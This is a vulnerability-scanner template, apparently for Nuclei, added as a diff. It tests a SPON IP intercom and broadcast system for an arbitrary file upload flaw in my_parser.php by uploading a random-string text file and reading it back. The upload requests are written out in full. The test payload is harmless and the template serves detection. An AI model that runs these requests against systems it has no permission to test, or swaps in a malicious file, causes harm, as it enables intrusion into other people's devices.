@@ -1,0 +1,41 @@
+id: shibangtongxin-SPON-IP-my_parser-upload
+
+info:
+  name: 世邦通信SPON-IP网络对讲广播系统my_parser.php任意文件上传漏洞
+  author: shibangtongxin
+  severity: high
+  tags: shibangtongxin
+
+http:
+  - raw:
+      - |
+        POST /upload/my_parser.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
+        Content-Type: multipart/form-data; boundary=0300a03a9419748c18d96a7e6e03d7be6f7f3f1ef6df950f196738fe8230
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+
+        --0300a03a9419748c18d96a7e6e03d7be6f7f3f1ef6df950f196738fe8230
+        Content-Disposition: form-data; name="upload"; filename="tsesd2159st.txt"
+        Content-Type: application/octet-stream
+        
+        {{randstr_1}}
+        --0300a03a9419748c18d96a7e6e03d7be6f7f3f1ef6df950f196738fe8230--
+
+      - |+
+        GET /upload/files/tsesd2159st.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr_1}}'
+    matchers-condition: and
